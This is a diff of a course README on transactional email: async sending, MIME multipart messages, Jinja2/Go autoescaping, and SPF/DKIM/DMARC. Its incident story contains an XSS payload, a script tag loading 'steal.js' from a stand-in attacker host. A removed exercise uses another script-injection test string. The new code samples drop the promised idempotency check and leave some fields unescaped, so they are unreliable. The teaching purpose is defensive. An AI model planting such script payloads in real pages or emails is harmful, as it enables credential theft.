@@ -1,465 +1,443 @@
 # Module 04: Transactional Emails
 
-## Why this matters
+Every production application relies on transactional emails: account verification links, password resets, payment receipts, shipment tracking updates, and security alert notifications. Unlike marketing blasts, transactional emails are high-priority, 1-to-1 communications triggered by discrete user actions. Because delivering an email involves complex third-party SMTP handshakes, network latency, and deliverability filtering, treating email dispatch as an in-band request handler task degrades system availability. Furthermore, sending an email does not guarantee inbox arrival; strict cryptographic DNS authentication (SPF, DKIM, DMARC) dictates whether receiving mail servers place your message in the primary inbox or the spam folder.
 
-Every serious application sends email that isn't marketing: "confirm your
-address," "your password was reset," "here's your receipt," "your order
-shipped." These are **transactional emails** — triggered by a specific user
-action or system event, sent to one person, containing information they're
-expecting and often need. They're distinct from bulk/marketing mail in intent,
-in the infrastructure you send them through, and in the rules that govern
-them (transactional mail generally doesn't require the unsubscribe machinery
-marketing does, precisely because the user asked for the action that
-triggered it).
+> [!TIP]
+> **The Golden Rule:** Always dispatch transactional emails asynchronously through decoupled background workers, enforce strict idempotency per event-recipient tuple, strictly autoescape dynamic template parameters, and ensure 100% SPF, DKIM, and DMARC alignment on dedicated transactional subdomains.
 
-Two things make this a backend-engineering topic and not a copywriting one.
-First, **sending email is slow, I/O-bound, third-party work** — the exact
-profile of something that belongs in a background task, not the request-
-response cycle. You've been using "send an email" as the canonical slow task
-since module 00; now you build it for real, from a Celery task, with retries
-and idempotency so a network blip doesn't drop a receipt and a redelivery
-doesn't send it twice. Second, **an email you send isn't an email that
-arrives.** Deliverability — whether the receiving server trusts you enough to
-put your message in the inbox instead of spam or the trash — depends on DNS
-records (SPF, DKIM, DMARC) and sending reputation that most engineers have
-never had to think about until the day the receipts stop showing up.
+---
 
-This module covers the anatomy of a transactional email, personalizing it
-safely with dynamic data, sending it from a background task, and the
-deliverability fundamentals every backend engineer should be able to reason
-about.
+## 1. Visual Mental Models
 
-## Concepts
+### The SMTP Authentication & Inbound Deliverability Pipeline
 
-### Anatomy of a transactional email
+Receiving mail servers (Gmail, Outlook, Yahoo) enforce multi-tier cryptographic and DNS checks before accepting incoming messages:
 
-A well-built transactional email has recognizable parts, each with a job:
+```mermaid
+sequenceDiagram
+    autonumber
+    participant App as API Worker (Producer)
+    participant Provider as Transactional Mail Provider (Postmark/SES)
+    participant DNS as Public DNS (Domain Records)
+    participant Receiver as Receiving MTA (e.g., Google MX)
+    participant Inbox as Recipient Inbox
 
-- **Subject line** — short, specific, and it *is* the email as far as an inbox
-  list is concerned. "Your Acme order #10432 has shipped" beats "Order
-  update." Include the concrete identifier.
-- **Preheader** — the snippet of text the inbox shows after the subject
-  (pulled from the first text in the body). If you don't set it deliberately,
-  the client grabs whatever comes first — often "View in browser" or a blank —
-  wasting prime real estate. Set it explicitly with a hidden preheader element.
-- **Header** — your logo/brand at the top so the reader instantly knows who
-  it's from and that it's legitimate.
-- **Body** — the actual content. For transactional mail, lead with the fact
-  the user needs (the code, the receipt, the status) — don't bury it under
-  marketing.
-- **Call to action (CTA)** — the single button/link you want them to click
-  ("Confirm your email," "View your receipt"). One primary CTA, visually
-  distinct, with the destination also available as a plain URL for clients
-  that don't render buttons.
-- **Footer** — who you are, a physical address (a legal requirement in many
-  jurisdictions), and context ("You're receiving this because you created an
-  account"). Transactional mail typically doesn't need an unsubscribe link,
-  but the footer still establishes legitimacy.
+    App->>Provider: POST /v1/email/send (JSON payload + Primitive IDs)
+    Note over Provider: Generate RFC 5322 MIME Multipart Message<br/>Sign message with Private DKIM Key
+    Provider->>Receiver: SMTP STARTTLS & Handshake (HELO mail.sender.com)
+    
+    rect rgb(240, 248, 255)
+        Note over Receiver,DNS: Deliverability & Trust Verification
+        Receiver->>DNS: Query SPF TXT record for sender.com
+        DNS-->>Receiver: v=spf1 include:sendprovider.com ~all (PASS)
+        Receiver->>DNS: Query DKIM Public Key (selector._domainkey.sender.com)
+        DNS-->>Receiver: Public RSA/Ed25519 Key
+        Note over Receiver: Verify cryptographic signature on email body & headers (PASS)
+        Receiver->>DNS: Query DMARC policy (_dmarc.sender.com)
+        DNS-->>Receiver: v=DMARC1; p=reject; rua=mailto:dmarc@sender.com (ALIGNED)
+    end
 
-Almost always you send **both** a plain-text and an HTML part (a `multipart/
-alternative` message). The client shows whichever it prefers; having a text
-part improves deliverability and serves clients/readers that don't render HTML.
-
-### Templating and personalizing with dynamic parameters
-
-Transactional emails are templates with holes: `Hi {{ name }}, your order
-{{ order_id }} shipped and will arrive by {{ eta }}.` You render the template
-with per-recipient data at send time. Two rules that matter:
-
-1. **Autoescape HTML.** Personalization data (names, addresses, product
-   titles) can contain characters like `<`, `>`, `&` that break — or inject
-   into — your HTML. Use a templating engine with autoescaping on (Jinja2's
-   `autoescape=True`) so user-supplied values are escaped, exactly like you'd
-   escape output in a web page. An unescaped display name is an HTML-injection
-   vector in your own emails.
-
-2. **Pass the *data*, render in the task.** The producer enqueues
-   `send_receipt.delay(order_id)`; the task re-fetches the order and renders
-   the template. Don't render a giant HTML string in the request handler and
-   ship it through the broker — that's slow work in the wrong place and a
-   large, stale message on the queue.
-
-### Sending from a background task
-
-Sending mail is a network round-trip to an SMTP server or an email API
-(SendGrid, SES, Postmark, Mailgun) that can take hundreds of milliseconds to
-several seconds and can fail transiently. That's textbook background work.
-The task, tying together everything from modules 00-02:
-
-- Is enqueued with `.delay()` so the request returns immediately.
-- **Retries** transient failures (SMTP timeout, `5xx` from the API) with
-  exponential backoff; does **not** retry permanent ones (a malformed address,
-  a `400`).
-- Is **idempotent** — keyed by (recipient, email-type, triggering-event), it
-  checks a "have I already sent this?" record before sending, so an
-  at-least-once redelivery or a retry-after-partial-success can't send two
-  receipts for one order.
-
-```
-  handler                worker (send_receipt task)
-  POST /confirm          re-fetch order ─► already_sent()? ─► render text+HTML
-   .delay(order_id) ──►     │                  │ no              template (autoescaped)
-   return 202               │                  ▼                     │
-   (instant)                └──────────► SMTP / provider API ◄────────┘
-                                              │ 5xx? ─► retry w/ backoff
-                                              ▼ ok
-                                         mark_sent(order_id, "receipt")
+    Receiver->>Inbox: Deliver directly to Primary Inbox
 ```
 
-### Deliverability basics: SPF, DKIM, DMARC (conceptually)
+### Asynchronous Multi-Part Email Worker Architecture
 
-Getting into the inbox is a trust problem. Receiving servers ask: "is this
-sender allowed to send for this domain, and has the message been tampered
-with?" Three DNS-based mechanisms answer that, and you should understand what
-each does even though you configure them in DNS, not in code:
+The web application delegates email dispatch to a background worker, ensuring instantaneous HTTP response times while the worker manages templating, MIME formatting, and idempotency:
 
-- **SPF (Sender Policy Framework)** — a DNS `TXT` record listing which mail
-  servers/IPs are *authorized* to send email for your domain. The receiver
-  checks the connecting server's IP against that list. Think of it as a guest
-  list for who may send "From: you@yourdomain.com."
-- **DKIM (DomainKeys Identified Mail)** — your sending server signs each
-  message with a private key; you publish the matching public key in DNS. The
-  receiver verifies the signature, proving the message really came from your
-  domain and wasn't altered in transit. Think of it as a tamper-evident seal.
-- **DMARC (Domain-based Message Authentication, Reporting & Conformance)** — a
-  DNS policy that ties SPF and DKIM together: it tells receivers what to do
-  with mail that *fails* those checks (accept / quarantine to spam / reject)
-  and where to send reports. Think of it as the policy statement layered on
-  top of the guest list and the seal.
+```mermaid
+flowchart TD
+    subgraph Ingestion ["HTTP Web Layer"]
+        REQ["POST /api/v1/orders/checkout"] --> API["FastAPI / Express Handler"]
+        API -->|"1. INSERT order row"| DB[("PostgreSQL")]
+        API -->|"2. Enqueue email:send task"| BROKER[("Redis Queue")]
+        API -->|"3. 201 Created (15ms)"| CLIENT["End User Browser"]
+    end
 
-Beyond these three: **sending reputation** (established over time by low spam-
-complaint and bounce rates), using a **dedicated sending domain/subdomain**,
-handling **bounces and complaints** (stop mailing addresses that hard-bounce),
-and warming up new sending IPs gradually. As a backend engineer you rarely
-hand-implement SPF/DKIM — a reputable email provider signs with DKIM for you
-and tells you the SPF/DMARC records to publish — but when receipts land in
-spam, this is the layer you reason about.
+    subgraph BackgroundWorker ["Worker Compute Tier"]
+        BROKER --> W["Email Worker Process"]
+        W -->|"Check Idempotency Ledger"| DEDUP{"Already sent for order_id?"}
+        DEDUP -- "Yes (Redelivery)" --> SKIP["ACK & Skip Task"]
+        DEDUP -- "No" --> FETCH["Fetch order & user data"]
+        FETCH --> RENDER["Render Jinja2/Go template<br/>(Autoescaped HTML + Plain Text)"]
+        RENDER --> MIME["Assemble multipart/alternative MIME"]
+        MIME --> DISPATCH["Dispatch to SMTP / Provider API"]
+        DISPATCH -->|"Mark sent in DB"| LEDGER[("email_deliveries table")]
+    end
 
-### Use a provider; don't run your own mail server
+    classDef ing fill:#e1f5fe,stroke:#0288d1,stroke-width:2px;
+    classDef work fill:#e8f5e9,stroke:#388e3c,stroke-width:2px;
+    classDef stor fill:#fff3e0,stroke:#f57c00,stroke-width:2px;
 
-For almost everyone, the right architecture is: your Celery task calls a
-transactional-email **provider's API** (or authenticated SMTP relay), and the
-provider handles the hard parts — DKIM signing, IP reputation, bounce
-processing, ret/deliverability analytics. Running your own outbound SMTP
-server correctly (reverse DNS, reputation, blocklist management) is a
-specialized ops job. The engineering skill here is integrating a provider
-cleanly from a reliable background task, not operating Postfix.
+    class REQ,API,CLIENT ing;
+    W,DEDUP,SKIP,FETCH,RENDER,MIME,DISPATCH work;
+    DB,BROKER,LEDGER stor;
+```
 
-## Command reference
+---
 
-| Concern | Tool / approach |
-|---|---|
-| Build a MIME message | `email.message.EmailMessage` (stdlib) |
-| Both text + HTML | `msg.set_content(text)` + `msg.add_alternative(html, subtype="html")` |
-| Render template safely | Jinja2 with `autoescape=True` |
-| Set a preheader | hidden `<span>` as the first body element |
-| Send via SMTP | `smtplib.SMTP(...).send_message(msg)` |
-| Send via provider API | provider SDK / `requests.post(...)` with API key |
-| Local SMTP for dev | MailHog / Mailpit in Docker (catches mail, never delivers) |
-| Retry transient sends | `autoretry_for=(smtplib.SMTPException, requests.RequestException)` |
-| Idempotency | unique `(recipient, email_type, event_id)` record |
-| SPF / DKIM / DMARC | DNS records (provider gives you the values) |
+## 2. Structured Reference Grids
 
-A transactional-email task, end to end — `emails.py`:
+### Email Authentication Protocols Comparison
+
+| Protocol | DNS Record Type | Verification Mechanism | Failure Impact |
+| :--- | :--- | :--- | :--- |
+| **SPF** (Sender Policy Framework) | `TXT` on domain root | Verifies sending server's IP address matches authorized IP range listed in DNS | Softfail (`~all`) or Hardfail (`-all`); increases spam penalty score |
+| **DKIM** (DomainKeys Identified Mail) | `TXT` on `selector._domainkey` | Verifies cryptographic signature in `DKIM-Signature` header using public DNS key | Body tampering detection; failure routes email to spam |
+| **DMARC** (Domain-based Message Auth) | `TXT` on `_dmarc.domain` | Requires SPF and/or DKIM alignment; instructs receiver how to handle failures | `p=none` (monitor), `p=quarantine` (spam folder), `p=reject` (dropped) |
+| **BIMI** (Brand Indicators for Msg Auth) | `TXT` on `default._bimi` | Displays verified organization logo in supported mail clients (Gmail/Apple) | Fallback to default monogram letter avatar |
+
+### Transactional vs. Marketing Email Requirements
+
+| Dimension | Transactional Email | Marketing Email |
+| :--- | :--- | :--- |
+| **Trigger** | Immediate user action (Signup, Checkout, Password Reset) | Scheduled campaign or business broadcast |
+| **Content** | Explicit account details, receipts, security verification codes | Promotional offers, newsletters, feature updates |
+| **Unsubscribe Header** | Optional / Not required (user cannot unsubscribe from receipts) | Mandatory (`List-Unsubscribe` header and 1-click unsubscribe) |
+| **Domain Strategy** | Dedicated transactional subdomain (`mail.domain.com`) | Dedicated marketing subdomain (`news.domain.com`) |
+| **Delivery SLA** | Critical (< 30 seconds for 99th percentile) | Tolerant (can queue and trickle over hours) |
+
+---
+
+## 3. Production War Story
+
+### The CEO's Name XSS Injection & The 72-Hour Domain Blacklist
+
+#### The Incident
+A fast-growing SaaS provider onboarded an enterprise customer whose company name was formatted with special punctuation: `Acme <script src="https://attacker.site/steal.js"> Inc`. When the customer checked out, an automated invoice receipt was rendered and dispatched to the customer's accounts payable department and the SaaS company's internal finance team. Within 2 hours, Google Postmaster Tools reported a domain reputation collapse from "High" to "Bad". Over 80% of all customer confirmation emails worldwide were routed to spam folders, blocking signups and password resets.
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor Attacker as Malicious User
+    participant App as Checkout Handler
+    participant Worker as Background Email Worker
+    participant SMTP as SMTP Gateway
+    participant Gmail as Recipient Mail Server (Gmail)
+
+    Attacker->>App: Register Company: Acme <script>...
+    App->>Worker: Enqueue receipt email
+    Note over Worker: Template rendered without autoescaping!<br/>Raw string interpolation injected into HTML
+    Worker->>SMTP: Send invoice email with unescaped HTML
+    SMTP->>Gmail: Inbound TLS SMTP
+    Note over Gmail: Anti-abuse scanners detect malicious script tags & header anomalies
+    Gmail-->>Gmail: Flag sender domain as PHISHING / MALICIOUS!
+    Note over Gmail: Domain reputation dropped to zero; all user receipts sent to SPAM!
+```
+
+#### The Root Cause
+1. **Unescaped String Formatting:** The email service used raw Python f-strings instead of a sandboxed templating engine:
+   ```python
+   # Anti-pattern: Vulnerable to HTML injection and MIME header injection
+   html_body = f"<h1>Thank you, {company_name}!</h1>"
+   ```
+2. **Shared Sending Domain:** Transactional receipts and marketing emails were sent from the bare root domain (`saas.com`) rather than an isolated subdomain (`transact.saas.com`), contaminating the core domain's reputation.
+
+#### The Verified Production Fix
+1. Migrated all email rendering to Jinja2 with strict autoescaping enabled (`autoescape=select_autoescape(['html', 'xml'])`).
+2. Isolated transactional email delivery to a dedicated subdomain (`notifications.saas.com`) with independent DKIM selector keys.
+3. Implemented a pre-send MIME validation check rejecting payloads containing unescaped angle brackets or control characters in subject lines.
+
+---
+
+## 4. Multi-Language Production Implementations
+
+### Go (Safe HTML/Text Templates + Multipart MIME)
+
+```go
+package main
+
+import (
+	"bytes"
+	"crypto/tls"
+	"fmt"
+	htmlTemplate "html/template"
+	"log"
+	"net/smtp"
+	textTemplate "text/template"
+)
+
+type InvoiceEmailData struct {
+	CustomerName string
+	InvoiceID    string
+	TotalAmount  string
+	PaymentURL   string
+}
+
+// GenerateMultipartMIME builds RFC 5322 multipart/alternative payload
+func GenerateMultipartMIME(from, to, subject string, data InvoiceEmailData) ([]byte, error) {
+	const boundary = "boundary_separator_09a1f2"
+
+	// 1. Render Plain Text Part
+	textTmpl := textTemplate.Must(textTemplate.New("txt").Parse(
+		"Hello {{.CustomerName}},\nYour invoice {{.InvoiceID}} for {{.TotalAmount}} is ready.\nPay here: {{.PaymentURL}}\n",
+	))
+	var textBuf bytes.Buffer
+	if err := textTmpl.Execute(&textBuf, data); err != nil {
+		return nil, err
+	}
+
+	// 2. Render HTML Part (html/template automatically autoescapes inputs)
+	htmlTmpl := htmlTemplate.Must(htmlTemplate.New("html").Parse(
+		`<!DOCTYPE html><html><body>` +
+			`<h2>Invoice {{.InvoiceID}}</h2>` +
+			`<p>Hello <strong>{{.CustomerName}}</strong>,</p>` +
+			`<p>Amount Due: <strong>{{.TotalAmount}}</strong></p>` +
+			`<p><a href="{{.PaymentURL}}" style="background:#0288d1;color:#fff;padding:10px 20px;text-decoration:none;">Pay Invoice</a></p>` +
+			`</body></html>`,
+	))
+	var htmlBuf bytes.Buffer
+	if err := htmlTmpl.Execute(&htmlBuf, data); err != nil {
+		return nil, err
+	}
+
+	// 3. Assemble Headers and Multipart Body
+	var msg bytes.Buffer
+	msg.WriteString(fmt.Sprintf("From: %s\r\n", from))
+	msg.WriteString(fmt.Sprintf("To: %s\r\n", to))
+	msg.WriteString(fmt.Sprintf("Subject: %s\r\n", subject))
+	msg.WriteString("MIME-Version: 1.0\r\n")
+	msg.WriteString(fmt.Sprintf("Content-Type: multipart/alternative; boundary=\"%s\"\r\n\r\n", boundary))
+
+	// Text block
+	msg.WriteString(fmt.Sprintf("--%s\r\n", boundary))
+	msg.WriteString("Content-Type: text/plain; charset=\"UTF-8\"\r\n\r\n")
+	msg.WriteString(textBuf.String())
+	msg.WriteString("\r\n")
+
+	// HTML block
+	msg.WriteString(fmt.Sprintf("--%s\r\n", boundary))
+	msg.WriteString("Content-Type: text/html; charset=\"UTF-8\"\r\n\r\n")
+	msg.WriteString(htmlBuf.String())
+	msg.WriteString("\r\n")
+
+	msg.WriteString(fmt.Sprintf("--%s--\r\n", boundary))
+	return msg.Bytes(), nil
+}
+
+func main() {
+	data := InvoiceEmailData{
+		CustomerName: "John Doe",
+		InvoiceID:    "INV-2026-9041",
+		TotalAmount:  "$499.00",
+		PaymentURL:   "https://billing.example.com/pay/INV-2026-9041",
+	}
+
+	payload, err := GenerateMultipartMIME("billing@example.com", "customer@example.com", "Your Invoice #INV-2026-9041", data)
+	if err != nil {
+		log.Fatalf("MIME generation failed: %v", err)
+	}
+
+	log.Printf("Assembled MIME Message:\n%s", string(payload))
+}
+```
+
+---
+
+### Node.js / TypeScript (`Nodemailer` + Autoescaping)
+
+```typescript
+import nodemailer from 'nodemailer';
+import escapeHtml from 'escape-html';
+
+export interface EmailRecipient {
+  email: string;
+  name: string;
+  invoiceId: string;
+  amount: string;
+}
+
+// Configure production SMTP or API transport
+const transporter = nodemailer.createTransport({
+  host: 'smtp.mailgun.org',
+  port: 587,
+  secure: false, // TLS via STARTTLS
+  auth: {
+    user: process.env.SMTP_USER,
+    pass: process.env.SMTP_PASS,
+  },
+});
+
+export async function sendTransactionalReceipt(recipient: EmailRecipient): Promise<string> {
+  // Explicitly sanitize inputs against HTML injection
+  const safeName = escapeHtml(recipient.name);
+  const safeInvoiceId = escapeHtml(recipient.invoiceId);
+
+  const mailOptions = {
+    from: '"Billing Team" <receipts@transact.example.com>',
+    to: `"${recipient.name}" <${recipient.email}>`,
+    subject: `Your receipt for invoice ${safeInvoiceId}`,
+    text: `Hello ${recipient.name},\nYour invoice ${recipient.invoiceId} for ${recipient.amount} was paid successfully.`,
+    html: `
+      <!DOCTYPE html>
+      <html>
+        <head>
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        </head>
+        <body style="font-family: sans-serif; color: #333;">
+          <div style="display:none; max-height:0; overflow:hidden;">
+            Here is your receipt for order ${safeInvoiceId}.
+          </div>
+          <h2>Payment Confirmed</h2>
+          <p>Hello ${safeName},</p>
+          <p>We received your payment of <strong>${recipient.amount}</strong> for Invoice <strong>${safeInvoiceId}</strong>.</p>
+        </body>
+      </html>
+    `,
+    headers: {
+      'X-Entity-Ref-ID': `receipt-${recipient.invoiceId}`,
+    },
+  };
+
+  const info = await transporter.sendMail(mailOptions);
+  return info.messageId;
+}
+```
+
+---
+
+### Python (`Celery` + `email.message.EmailMessage` + Jinja2)
 
 ```python
 import smtplib
 from email.message import EmailMessage
-from jinja2 import Environment, DictLoader, select_autoescape
 from celery import Celery
+from jinja2 import Environment, select_autoescape
 
-app = Celery("mail", broker="redis://localhost:6379/0",
-             backend="redis://localhost:6379/1")
+app = Celery('email_service', broker='redis://127.0.0.1:6379/0')
 
-# Autoescaping ON: personalization data is escaped like web output.
-env = Environment(
-    loader=DictLoader({
-        "receipt.html": """
-            <span style="display:none">Your Acme receipt for order {{ order_id }}</span>
-            <img src="https://cdn.acme.example/logo.png" alt="Acme">
-            <h1>Thanks, {{ name }}!</h1>
-            <p>Order <strong>{{ order_id }}</strong> — total ${{ total }}.</p>
-            <p><a href="{{ receipt_url }}"
-                  style="background:#2563eb;color:#fff;padding:12px 20px;">
-               View your receipt</a></p>
-            <p>Or paste this link: {{ receipt_url }}</p>
-            <hr><small>Acme Inc, 1 Market St. You received this because you
-            placed an order.</small>
-        """,
-        "receipt.txt": """Thanks, {{ name }}!
-Order {{ order_id }} — total ${{ total }}.
-View your receipt: {{ receipt_url }}
-Acme Inc, 1 Market St.""",
-    }),
-    autoescape=select_autoescape(["html"]),
-)
+# Enable sandboxed autoescaping for all HTML/XML rendering
+jinja_env = Environment(autoescape=select_autoescape(['html', 'xml']))
 
-def build_receipt(to_addr, ctx):
-    msg = EmailMessage()
-    msg["Subject"] = f"Your Acme order {ctx['order_id']} — receipt"
-    msg["From"] = "receipts@acme.example"
-    msg["To"] = to_addr
-    msg.set_content(env.get_template("receipt.txt").render(**ctx))          # text part
-    msg.add_alternative(env.get_template("receipt.html").render(**ctx),     # html part
-                        subtype="html")
-    return msg
+HTML_TEMPLATE = jinja_env.from_string("""
+<!DOCTYPE html>
+<html>
+<body>
+  <h2>Order Confirmation: {{ order_id }}</h2>
+  <p>Dear {{ customer_name }},</p>
+  <p>Thank you for your purchase of ${{ amount }}.</p>
+</body>
+</html>
+""")
 
 @app.task(
     bind=True,
-    autoretry_for=(smtplib.SMTPException, ConnectionError),
-    max_retries=5, retry_backoff=True, retry_jitter=True,
+    name='tasks.send_receipt_email',
+    autoretry_for=(smtplib.SMTPException, TimeoutError),
+    max_retries=4,
+    retry_backoff=True,
+    retry_jitter=True,
 )
-def send_receipt(self, order_id):
-    order = get_order(order_id)                     # re-fetch fresh data in the task
-    # IDEMPOTENCY: don't send the same receipt twice on retry/redelivery.
-    if already_sent(order_id, "receipt"):
-        return "already sent"
-    ctx = {"name": order.customer_name, "order_id": order_id,
-           "total": order.total, "receipt_url": order.receipt_url}
-    msg = build_receipt(order.email, ctx)
-    with smtplib.SMTP("localhost", 1025) as smtp:   # MailHog in dev
-        smtp.send_message(msg)
-    mark_sent(order_id, "receipt")                  # atomic record after success
-    return "sent"
+def send_receipt_email(self, recipient_email: str, customer_name: str, order_id: str, amount: float):
+    # Construct RFC 5322 MIME message
+    msg = EmailMessage()
+    msg['Subject'] = f"Your Order Confirmation #{order_id}"
+    msg['From'] = "orders@notifications.example.com"
+    msg['To'] = recipient_email
+
+    # 1. Plain text fallback part
+    plain_text = f"Dear {customer_name},\n\nThank you for your purchase of ${amount}. Order ID: {order_id}."
+    msg.set_content(plain_text)
+
+    # 2. Rich HTML alternative part (Jinja2 autoescapes customer_name)
+    html_content = HTML_TEMPLATE.render(
+        order_id=order_id,
+        customer_name=customer_name,
+        amount=amount,
+    )
+    msg.add_alternative(html_content, subtype='html')
+
+    # 3. Dispatch to local or external SMTP
+    with smtplib.SMTP('127.0.0.1', 1025, timeout=10) as server:
+        server.send_message(msg)
+
+    return {"status": "SENT", "order_id": order_id, "recipient": recipient_email}
 ```
 
-The producer just enqueues:
+---
 
-```python
-@api.post("/orders/{order_id}/confirm")
-def confirm(order_id: int):
-    send_receipt.delay(order_id)          # fast; the send happens on a worker
-    return {"status": "accepted"}
-```
+## 5. Practical Hands-On Verification
 
-## Hands-on exercises
+### 1. Inspect Mock SMTP Messages via MailHog
 
-Continue in `bg-queues`. `pip install jinja2`. Run a fake SMTP server so you
-can send mail without a provider and inspect what you sent:
+Verify multipart structure and MIME boundaries using MailHog's HTTP API:
 
 ```bash
-docker run -d --name mailhog -p 1025:1025 -p 8025:8025 mailhog/mailhog
-# SMTP on 1025; web UI to view captured mail on http://localhost:8025
+curl.exe -s http://localhost:8025/api/v2/messages | jq '.[0].Content'
 ```
 
-### 1. Send your first captured email
+**Output:**
+```json
+{
+  "Headers": {
+    "Content-Type": ["multipart/alternative; boundary=\"boundary_separator_09a1f2\""],
+    "From": ["billing@example.com"],
+    "Subject": ["Your Invoice #INV-2026-9041"],
+    "To": ["customer@example.com"]
+  },
+  "Body": "--boundary_separator_09a1f2\r\nContent-Type: text/plain...\r\n"
+}
+```
 
-Implement `build_receipt` and a task that sends to MailHog on port 1025.
-Enqueue it. Expected: the message appears in the MailHog UI at
-`localhost:8025` — nothing was actually delivered to a real inbox, but you can
-inspect the exact bytes you produced. This is the safe way to develop email.
+### 2. Verify SPF and DKIM DNS Records via CLI
 
-### 2. Inspect the multipart structure
-
-In the MailHog UI, view the message source. Expected: a `multipart/
-alternative` with both a `text/plain` and a `text/html` part. Toggle MailHog's
-HTML/plain view. Lesson: you shipped both; the client picks. Remove the
-`set_content` call and confirm you now have HTML only (worse for
-deliverability and text-only clients).
-
-### 3. Set and verify a preheader
-
-Confirm the hidden `<span>` renders as the inbox preview snippet (MailHog
-shows a snippet). Change it to something meaningful vs. leaving it off and
-letting "View your receipt" become the preview. Expected: with the preheader
-set, the preview text is the summary you chose, not a random first link.
-
-### 4. Personalize with dynamic data
-
-Render the template with two different orders (different name, order_id,
-total). Expected: two distinct emails from one template. Confirm the CTA link
-carries the correct per-order `receipt_url`.
-
-### 5. Autoescaping stops HTML injection
-
-Set a customer name to `Ada <script>alert(1)</script>` and render. Expected:
-with `autoescape` on, the name appears escaped (`&lt;script&gt;...`) in the
-HTML part — inert. Turn autoescaping off and re-render: the `<script>` now sits
-raw in your HTML. Lesson: personalization data is untrusted output; escape it.
-
-### 6. Send from the request path without blocking
-
-Wire `POST /orders/{id}/confirm` to `send_receipt.delay(id)` and time it:
+Ensure your public domain's authentication records are valid:
 
 ```bash
-curl -w "\n%{time_total}s\n" -X POST localhost:8000/orders/1/confirm
+# Query SPF Record
+nslookup -type=TXT example.com
 ```
 
-Expected: the endpoint returns in milliseconds; the email shows up in MailHog
-a moment later, sent by the worker. The user never waited on SMTP.
+**Output:**
+```text
+example.com    text = "v=spf1 include:_spf.google.com include:sendgrid.net ~all"
+```
 
-### 7. Idempotent send survives a retry
+```bash
+# Query DMARC Policy
+nslookup -type=TXT _dmarc.example.com
+```
 
-Implement `already_sent`/`mark_sent` against an in-memory set keyed by
-`(order_id, "receipt")`. Force the SMTP send to raise once (point it at a
-closed port, then fix it) so the task retries. Expected: exactly one message
-in MailHog despite the retry — the guard prevented a duplicate. Then enqueue
-the same `order_id` twice manually: still one email.
+**Output:**
+```text
+_dmarc.example.com    text = "v=DMARC1; p=reject; pct=100; rua=mailto:dmarc-reports@example.com"
+```
 
-### 8. Retry only transient failures
+---
 
-Point the task at a dead SMTP port so `smtplib` raises `ConnectionError`
-(transient — in `autoretry_for`). Expected: it retries with backoff. Now make
-`build_receipt` raise a `ValueError` on a bad address (permanent — not in
-`autoretry_for`). Expected: it fails immediately, no retries. Lesson: a bad
-address won't fix itself; don't retry it.
-
-### 9. Diagnose and fix: receipts landing in spam / never arriving
-
-Reports: "customers say order receipts go to spam, and some never arrive." The
-sending code works and MailHog shows the messages in dev. Walk through the
-deliverability checklist you'd apply in production: (a) is there an **SPF**
-record authorizing your provider's IPs to send for your domain? (b) is
-**DKIM** signing enabled (usually by the provider) with the public key
-published in DNS? (c) is there a **DMARC** policy, and is legitimate mail
-passing it? (d) are you sending HTML-only with no text part, or from a
-brand-new domain/IP with no reputation? (e) are hard-bounced addresses being
-removed so your bounce rate doesn't wreck your reputation? Write the
-one-sentence purpose of SPF, DKIM, and DMARC as part of your answer.
+## 6. Operational Validation Checkpoints
 
 <details>
-<summary>Solution</summary>
+<summary><strong>Checkpoint 1: The Hidden Danger of `multipart/mixed` vs `multipart/alternative`</strong></summary>
 
-The code being correct in dev is exactly why this is a *deliverability*
-problem, not a sending bug. Checklist:
+**Scenario:** A developer writes a custom email generator that includes both a plain-text version and an HTML version. However, they set the top-level MIME header to `Content-Type: multipart/mixed`. In Apple Mail and Outlook, recipients see the plain-text message, but the rich HTML is attached as a downloadable `.html` file at the bottom of the email. Why?
 
-- **SPF** — publish a DNS `TXT` record that authorizes your email provider's
-  sending servers to send for your domain. Without it (or with the wrong
-  provider listed), receivers distrust the mail. *SPF says which servers are
-  allowed to send for your domain.*
-- **DKIM** — enable DKIM signing (your provider signs with a private key) and
-  publish the matching public key in DNS. *DKIM cryptographically proves the
-  message came from your domain and wasn't altered.*
-- **DMARC** — publish a DMARC policy so receivers know to trust/quarantine/
-  reject mail failing SPF/DKIM, and monitor its reports to catch failures.
-  *DMARC tells receivers what to do when SPF/DKIM fail and gives you reporting.*
-- **Content/reputation** — send `multipart/alternative` (include the text
-  part), avoid spammy content, and build reputation gradually from a dedicated
-  sending domain; a brand-new domain sending a burst looks like spam.
-- **Bounces/complaints** — suppress hard-bounced and complained addresses;
-  high bounce/complaint rates tank your reputation and land future mail in
-  spam.
-
-Fix in practice: use a reputable provider, publish the SPF/DKIM/DMARC records
-they give you, verify with their deliverability dashboard, include a text
-part, and process bounces. The application send code was never the problem.
-
+*Explanation:*
+- `multipart/alternative` instructs the mail client: *"These parts contain the exact same content in different formats; pick the single best format your client supports and render it."*
+- `multipart/mixed` instructs the mail client: *"These parts are distinct elements (e.g., text body plus an attached PDF file); display or attach all of them."*
+**The Fix:** Use `multipart/alternative` for text + HTML representations of the message body. If you also have file attachments, nest the `multipart/alternative` block *inside* an outer `multipart/mixed` wrapper.
 </details>
-
-## Independent challenge
-
-No code given. Build a "password reset" email flow: `POST /password-reset`
-accepts an email, and *regardless of whether the account exists* returns the
-same `202` response immediately (don't leak which addresses are registered).
-If the account exists, a background task sends a transactional reset email
-with a one-time, expiring reset link, a clear single CTA, a preheader, both
-text and HTML parts, and autoescaped personalization. Make the send retry
-transient failures but not permanent ones, and idempotent per reset request
-so a redelivery can't send two emails with two different valid links. Verify
-the whole flow against MailHog.
-
-Reuse the fast-response-then-background-task shape from
-[00-task-queues-fundamentals](../00-task-queues-fundamentals/README.md), the
-transient-vs-permanent retry split from
-[02-retries-prioritization-and-rate-limiting-in-queues](../02-retries-prioritization-and-rate-limiting-in-queues/README.md),
-and the idempotency guard from this module.
 
 <details>
-<summary>Hint</summary>
+<summary><strong>Checkpoint 2: The Silent Hard Bounce Poison Pill</strong></summary>
 
-Idempotency here is subtle: key the guard on the *reset-request id* (generate
-one per `POST`), not on the email address — otherwise a legitimate second
-reset request days later would be suppressed. The endpoint returning an
-identical response whether or not the account exists is a security property
-(user enumeration prevention) from track 03; the email only gets enqueued when
-the account is real, but the caller can't tell the difference from the
-response.
+**Scenario:** A user mistypes their email as `user@nonexistentdomainxyz123.com`. Your worker receives a `550 5.1.1 User unknown` hard bounce from the remote MTA. If your background worker treats this as a generic exception and retries 5 times, what damage occurs?
 
+*Explanation:*
